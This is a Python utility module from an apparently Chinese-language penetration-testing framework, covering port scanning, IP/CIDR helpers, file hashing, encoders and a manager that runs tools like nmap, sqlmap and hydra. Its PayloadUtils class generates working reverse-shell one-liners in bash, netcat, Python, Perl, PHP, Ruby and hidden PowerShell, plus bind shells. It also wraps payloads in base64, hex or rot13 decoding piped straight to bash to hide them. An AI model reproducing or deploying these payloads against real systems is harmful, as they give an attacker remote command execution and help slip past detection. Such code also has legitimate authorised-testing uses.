#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
工具模組
Tools Module

提供常用的滲透測試工具集成
"""

import os
import re
import json
import time
import socket
import struct
import hashlib
import base64
import subprocess
from typing import Dict, List, Any, Optional, Union, Tuple
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlparse
from enum import Enum
import asyncio
import ipaddress

from ..core.logger import get_logger


class ToolType(Enum):
    """
    工具類型
    """
    SCANNER = "scanner"
    EXPLOIT = "exploit"
    POST_EXPLOIT = "post_exploit"
    UTILITY = "utility"
    FORENSICS = "forensics"


@dataclass
class ToolInfo:
    """
    工具信息
    """
    name: str
    version: str = ""
    path: str = ""
    available: bool = False
    tool_type: ToolType = ToolType.UTILITY
    description: str = ""
    requirements: List[str] = None

    def __post_init__(self):
        if self.requirements is None:
            self.requirements = []


class NetworkUtils:
    """
    網絡工具類
    """
    
    @staticmethod
    def is_valid_ip(ip: str) -> bool:
        """
        驗證IP地址
        
        Args:
            ip: IP地址
            
        Returns:
            是否有效
        """
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    @staticmethod
    def is_valid_cidr(cidr: str) -> bool:
        """
        驗證CIDR網段
        
        Args:
            cidr: CIDR網段
            
        Returns:
            是否有效
        """
        try:
            ipaddress.ip_network(cidr, strict=False)
            return True
        except ValueError:
            return False
    
    @staticmethod
    def expand_cidr(cidr: str) -> List[str]:
        """
        展開CIDR網段為IP列表
        
        Args:
            cidr: CIDR網段
            
        Returns:
            IP地址列表
        """
        try:
            network = ipaddress.ip_network(cidr, strict=False)
            return [str(ip) for ip in network.hosts()]
        except ValueError:
            return []
    
    @staticmethod
    def parse_port_range(port_range: str) -> List[int]:
        """
        解析端口範圍
        
        Args:
            port_range: 端口範圍 (例如: "80,443,8000-8080")
            
        Returns:
            端口列表
        """
        ports = []
        
        for part in port_range.split(','):
            part = part.strip()
            if '-' in part:
                start, end = map(int, part.split('-'))
                ports.extend(range(start, end + 1))
            else:
                ports.append(int(part))
        
        return sorted(list(set(ports)))
    
    @staticmethod
    def is_port_open(host: str, port: int, timeout: float = 3.0) -> bool:
        """
        檢查端口是否開放
        
        Args:
            host: 主機地址
            port: 端口號
            timeout: 超時時間
            
        Returns:
            端口是否開放
        """
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except (socket.timeout, socket.error):
            return False
    
    @staticmethod
    async def async_port_scan(host: str, ports: List[int], 
                             timeout: float = 3.0, max_concurrent: int = 100) -> List[int]:
        """
        異步端口掃描
        
        Args:
            host: 主機地址
            ports: 端口列表
            timeout: 超時時間
            max_concurrent: 最大並發數
            
        Returns:
            開放端口列表
        """
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def check_port(port: int) -> Optional[int]:
            async with semaphore:
                try:
                    future = asyncio.open_connection(host, port)
                    reader, writer = await asyncio.wait_for(future, timeout=timeout)
                    writer.close()
                    await writer.wait_closed()
                    return port
                except (asyncio.TimeoutError, OSError):
                    return None
        
        tasks = [check_port(port) for port in ports]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        return [port for port in results if isinstance(port, int)]
    
    @staticmethod
    def get_local_ip() -> str:
        """
        獲取本地IP地址
        
        Returns:
            本地IP地址
        """
        try:
            # 連接到一個遠程地址來獲取本地IP
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"
    
    @staticmethod
    def resolve_hostname(hostname: str) -> Optional[str]:
        """
        解析主機名為IP地址
        
        Args:
            hostname: 主機名
            
        Returns:
            IP地址
        """
        try:
            return socket.gethostbyname(hostname)
        except socket.gaierror:
            return None


class FileUtils:
    """
    文件工具類
    """
    
    @staticmethod
    def calculate_hash(file_path: str, algorithm: str = "md5") -> str:
        """
        計算文件哈希值
        
        Args:
            file_path: 文件路徑
            algorithm: 哈希算法 (md5, sha1, sha256)
            
        Returns:
            哈希值
        """
        hash_func = getattr(hashlib, algorithm.lower())()
        
        try:
            with open(file_path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hash_func.update(chunk)
            return hash_func.hexdigest()
        except Exception:
            return ""
    
    @staticmethod
    def get_file_info(file_path: str) -> Dict[str, Any]:
        """
        獲取文件信息
        
        Args:
            file_path: 文件路徑
            
        Returns:
            文件信息字典
        """
        path = Path(file_path)
        
        if not path.exists():
            return {}
        
        stat = path.stat()
        
        return {
            "name": path.name,
            "size": stat.st_size,
            "created": stat.st_ctime,
            "modified": stat.st_mtime,
            "accessed": stat.st_atime,
            "is_file": path.is_file(),
            "is_dir": path.is_dir(),
            "extension": path.suffix,
            "md5": FileUtils.calculate_hash(file_path, "md5") if path.is_file() else "",
            "sha256": FileUtils.calculate_hash(file_path, "sha256") if path.is_file() else ""
        }
    
    @staticmethod
    def find_files(directory: str, pattern: str = "*", recursive: bool = True) -> List[str]:
        """
        查找文件
        
        Args:
            directory: 搜索目錄
            pattern: 文件模式
            recursive: 是否遞歸搜索
            
        Returns:
            文件路徑列表
        """
        path = Path(directory)
        
        if not path.exists():
            return []
        
        if recursive:
            return [str(p) for p in path.rglob(pattern) if p.is_file()]
        else:
            return [str(p) for p in path.glob(pattern) if p.is_file()]
    
    @staticmethod
    def safe_filename(filename: str) -> str:
        """
        生成安全的文件名
        
        Args:
            filename: 原始文件名
            
        Returns:
            安全的文件名
        """
        # 移除或替換不安全的字符
        safe_chars = re.sub(r'[<>:"/\\|?*]', '_', filename)
        # 限制長度
        return safe_chars[:255]
    
    @staticmethod
    def create_directory(directory: str, mode: int = 0o755) -> bool:
        """
        創建目錄
        
        Args:
            directory: 目錄路徑
            mode: 權限模式
            
        Returns:
            是否成功
        """
        try:
            Path(directory).mkdir(parents=True, exist_ok=True, mode=mode)
            return True
        except Exception:
            return False


class EncodingUtils:
    """
    編碼工具類
    """
    
    @staticmethod
    def base64_encode(data: Union[str, bytes]) -> str:
        """
        Base64編碼
        
        Args:
            data: 要編碼的數據
            
        Returns:
            編碼後的字符串
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
        return base64.b64encode(data).decode('ascii')
    
    @staticmethod
    def base64_decode(data: str) -> bytes:
        """
        Base64解碼
        
        Args:
            data: 要解碼的字符串
            
        Returns:
            解碼後的字節
        """
        return base64.b64decode(data)
    
    @staticmethod
    def url_encode(data: str) -> str:
        """
        URL編碼
        
        Args:
            data: 要編碼的字符串
            
        Returns:
            編碼後的字符串
        """
        from urllib.parse import quote
        return quote(data)
    
    @staticmethod
    def url_decode(data: str) -> str:
        """
        URL解碼
        
        Args:
            data: 要解碼的字符串
            
        Returns:
            解碼後的字符串
        """
        from urllib.parse import unquote
        return unquote(data)
    
    @staticmethod
    def hex_encode(data: Union[str, bytes]) -> str:
        """
        十六進制編碼
        
        Args:
            data: 要編碼的數據
            
        Returns:
            編碼後的字符串
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
        return data.hex()
    
    @staticmethod
    def hex_decode(data: str) -> bytes:
        """
        十六進制解碼
        
        Args:
            data: 要解碼的字符串
            
        Returns:
            解碼後的字節
        """
        return bytes.fromhex(data)


class PayloadUtils:
    """
    載荷工具類
    """
    
    @staticmethod
    def generate_reverse_shell(lhost: str, lport: int, shell_type: str = "bash") -> str:
        """
        生成反向Shell載荷
        
        Args:
            lhost: 監聽主機
            lport: 監聽端口
            shell_type: Shell類型
            
        Returns:
            載荷字符串
        """
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
        
        return payloads.get(shell_type.lower(), payloads["bash"])
    
    @staticmethod
    def generate_bind_shell(lport: int, shell_type: str = "bash") -> str:
        """
        生成綁定Shell載荷
        
        Args:
            lport: 綁定端口
            shell_type: Shell類型
            
        Returns:
            載荷字符串
        """
        payloads = {
            "bash": f"bash -i >& /dev/tcp/0.0.0.0/{lport} 0>&1",
            "nc": f"nc -lvp {lport} -e /bin/sh",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
        }
        
        return payloads.get(shell_type.lower(), payloads["bash"])
    
    @staticmethod
    def obfuscate_payload(payload: str, method: str = "base64") -> str:
        """
        混淆載荷
        
        Args:
            payload: 原始載荷
            method: 混淆方法
            
        Returns:
            混淆後的載荷
        """
        if method == "base64":
            encoded = EncodingUtils.base64_encode(payload)
            return f"echo {encoded} | base64 -d | bash"
        elif method == "hex":
            encoded = EncodingUtils.hex_encode(payload)
            return f"echo {encoded} | xxd -r -p | bash"
        elif method == "rot13":
            import codecs
            encoded = codecs.encode(payload, 'rot13')
            return f"echo '{encoded}' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash"
        else:
            return payload


class ToolManager:
    """
    工具管理器
    """
    
    def __init__(self):
        self.logger = get_logger()
        self.tools: Dict[str, ToolInfo] = {}
        self._scan_tools()
    
    def _scan_tools(self):
        """
        掃描系統中可用的工具
        """
        common_tools = {
            "nmap": ToolInfo("nmap", tool_type=ToolType.SCANNER, description="Network discovery and security auditing"),
            "masscan": ToolInfo("masscan", tool_type=ToolType.SCANNER, description="Fast port scanner"),
            "nikto": ToolInfo("nikto", tool_type=ToolType.SCANNER, description="Web server scanner"),
            "sqlmap": ToolInfo("sqlmap", tool_type=ToolType.EXPLOIT, description="SQL injection tool"),
            "hydra": ToolInfo("hydra", tool_type=ToolType.EXPLOIT, description="Password cracking tool"),
            "john": ToolInfo("john", tool_type=ToolType.EXPLOIT, description="Password cracker"),
            "hashcat": ToolInfo("hashcat", tool_type=ToolType.EXPLOIT, description="Advanced password recovery"),
            "gobuster": ToolInfo("gobuster", tool_type=ToolType.SCANNER, description="Directory/file brute-forcer"),
            "dirb": ToolInfo("dirb", tool_type=ToolType.SCANNER, description="Web content scanner"),
            "wpscan": ToolInfo("wpscan", tool_type=ToolType.SCANNER, description="WordPress security scanner"),
            "burpsuite": ToolInfo("burpsuite", tool_type=ToolType.SCANNER, description="Web application security testing"),
            "wireshark": ToolInfo("wireshark", tool_type=ToolType.FORENSICS, description="Network protocol analyzer"),
            "tcpdump": ToolInfo("tcpdump", tool_type=ToolType.FORENSICS, description="Network packet analyzer"),
            "netcat": ToolInfo("nc", tool_type=ToolType.UTILITY, description="Network utility"),
            "curl": ToolInfo("curl", tool_type=ToolType.UTILITY, description="Data transfer tool"),
            "wget": ToolInfo("wget", tool_type=ToolType.UTILITY, description="Web downloader"),
            "git": ToolInfo("git", tool_type=ToolType.UTILITY, description="Version control system")
        }
        
        for name, tool in common_tools.items():
            tool.path = self._find_tool_path(tool.name)
            tool.available = bool(tool.path)
            if tool.available:
                tool.version = self._get_tool_version(tool.name, tool.path)
            self.tools[name] = tool
    
    def _find_tool_path(self, tool_name: str) -> str:
        """
        查找工具路径
        
        Args:
            tool_name: 工具名稱
            
        Returns:
            工具路径
        """
        import shutil
        return shutil.which(tool_name) or ""
    
    def _get_tool_version(self, tool_name: str, tool_path: str) -> str:
        """
        獲取工具版本
        
        Args:
            tool_name: 工具名稱
            tool_path: 工具路径
            
        Returns:
            版本信息
        """
        version_commands = {
            "nmap": ["--version"],
            "masscan": ["--version"],
            "nikto": ["-Version"],
            "sqlmap": ["--version"],
            "hydra": ["-h"],
            "john": ["--version"],
            "hashcat": ["--version"],
            "gobuster": ["version"],
            "dirb": [],
            "wpscan": ["--version"],
            "nc": ["-h"],
            "curl": ["--version"],
            "wget": ["--version"],
            "git": ["--version"]
        }
        
        try:
            cmd = [tool_path] + version_commands.get(tool_name, ["--version"])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            # 提取版本號
            output = result.stdout + result.stderr
            version_patterns = [
                r'version\s+([\d\.]+)',
                r'v([\d\.]+)',
                r'([\d\.]+)',
            ]
            
            for pattern in version_patterns:
                match = re.search(pattern, output, re.IGNORECASE)
                if match:
                    return match.group(1)
            
            return "unknown"
            
        except Exception:
            return "unknown"
    
    def get_tool(self, name: str) -> Optional[ToolInfo]:
        """
        獲取工具信息
        
        Args:
            name: 工具名稱
            
        Returns:
            工具信息
        """
        return self.tools.get(name)
    
    def get_available_tools(self, tool_type: Optional[ToolType] = None) -> List[ToolInfo]:
        """
        獲取可用工具列表
        
        Args:
            tool_type: 工具類型過濾
            
        Returns:
            可用工具列表
        """
        tools = [tool for tool in self.tools.values() if tool.available]
        
        if tool_type:
            tools = [tool for tool in tools if tool.tool_type == tool_type]
        
        return tools
    
    def is_tool_available(self, name: str) -> bool:
        """
        檢查工具是否可用
        
        Args:
            name: 工具名稱
            
        Returns:
            是否可用
        """
        tool = self.tools.get(name)
        return tool.available if tool else False
    
    def run_tool(self, name: str, args: List[str], 
                timeout: int = 300, cwd: Optional[str] = None) -> Dict[str, Any]:
        """
        運行工具
        
        Args:
            name: 工具名稱
            args: 參數列表
            timeout: 超時時間
            cwd: 工作目錄
            
        Returns:
            執行結果
        """
        tool = self.tools.get(name)
        if not tool or not tool.available:
            return {
                "success": False,
                "error": f"Tool {name} not available",
                "stdout": "",
                "stderr": "",
                "returncode": -1
            }
        
        try:
            cmd = [tool.path] + args
            self.logger.info(f"Running tool: {' '.join(cmd)}")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=cwd
            )
            
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "command": ' '.join(cmd)
            }
            
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": f"Tool {name} timed out after {timeout} seconds",
                "stdout": "",
                "stderr": "",
                "returncode": -1
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "stdout": "",
                "stderr": "",
                "returncode": -1
            }
    
    async def run_tool_async(self, name: str, args: List[str], 
                           timeout: int = 300, cwd: Optional[str] = None) -> Dict[str, Any]:
        """
        異步運行工具
        
        Args:
            name: 工具名稱
            args: 參數列表
            timeout: 超時時間
            cwd: 工作目錄
            
        Returns:
            執行結果
        """
        tool = self.tools.get(name)
        if not tool or not tool.available:
            return {
                "success": False,
                "error": f"Tool {name} not available",
                "stdout": "",
                "stderr": "",
                "returncode": -1
            }
        
        try:
            cmd = [tool.path] + args
            self.logger.info(f"Running tool async: {' '.join(cmd)}")
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=cwd
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(), timeout=timeout
            )
            
            return {
                "success": process.returncode == 0,
                "stdout": stdout.decode('utf-8', errors='ignore'),
                "stderr": stderr.decode('utf-8', errors='ignore'),
                "returncode": process.returncode,
                "command": ' '.join(cmd)
            }
            
        except asyncio.TimeoutError:
            if process:
                process.kill()
                await process.wait()
            return {
                "success": False,
                "error": f"Tool {name} timed out after {timeout} seconds",
                "stdout": "",
                "stderr": "",
                "returncode": -1
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "stdout": "",
                "stderr": "",
                "returncode": -1
            }
    
    def get_tool_suggestions(self, task: str) -> List[str]:
        """
        根據任務獲取工具建議
        
        Args:
            task: 任務描述
            
        Returns:
            建議的工具列表
        """
        task_lower = task.lower()
        suggestions = []
        
        # 網絡掃描
        if any(keyword in task_lower for keyword in ['scan', 'port', 'network', 'discovery']):
            suggestions.extend(['nmap', 'masscan'])
        
        # Web掃描
        if any(keyword in task_lower for keyword in ['web', 'http', 'website']):
            suggestions.extend(['nikto', 'gobuster', 'dirb'])
        
        # 密碼破解
        if any(keyword in task_lower for keyword in ['password', 'crack', 'brute']):
            suggestions.extend(['hydra', 'john', 'hashcat'])
        
        # SQL注入
        if any(keyword in task_lower for keyword in ['sql', 'injection', 'database']):
            suggestions.append('sqlmap')
        
        # WordPress
        if 'wordpress' in task_lower or 'wp' in task_lower:
            suggestions.append('wpscan')
        
        # 網絡分析
        if any(keyword in task_lower for keyword in ['packet', 'traffic', 'capture']):
            suggestions.extend(['wireshark', 'tcpdump'])
        
        # 只返回可用的工具
        return [tool for tool in suggestions if self.is_tool_available(tool)]


# 全局工具管理器實例
_tool_manager = None

def get_tool_manager() -> ToolManager:
    """
    獲取全局工具管理器實例
    
    Returns:
        工具管理器實例
    """
    global _tool_manager
    if _tool_manager is None:
        _tool_manager = ToolManager()
    return _tool_manager


# 便捷函數
def is_valid_ip(ip: str) -> bool:
    """驗證IP地址"""
    return NetworkUtils.is_valid_ip(ip)

def is_valid_cidr(cidr: str) -> bool:
    """驗證CIDR網段"""
    return NetworkUtils.is_valid_cidr(cidr)

def expand_cidr(cidr: str) -> List[str]:
    """展開CIDR網段"""
    return NetworkUtils.expand_cidr(cidr)

def parse_port_range(port_range: str) -> List[int]:
    """解析端口範圍"""
    return NetworkUtils.parse_port_range(port_range)

def is_port_open(host: str, port: int, timeout: float = 3.0) -> bool:
    """檢查端口是否開放"""
    return NetworkUtils.is_port_open(host, port, timeout)

def calculate_hash(file_path: str, algorithm: str = "md5") -> str:
    """計算文件哈希值"""
    return FileUtils.calculate_hash(file_path, algorithm)

def generate_reverse_shell(lhost: str, lport: int, shell_type: str = "bash") -> str:
    """生成反向Shell載荷"""
    return PayloadUtils.generate_reverse_shell(lhost, lport, shell_type)

def is_tool_available(name: str) -> bool:
    """檢查工具是否可用"""
    return get_tool_manager().is_tool_available(name)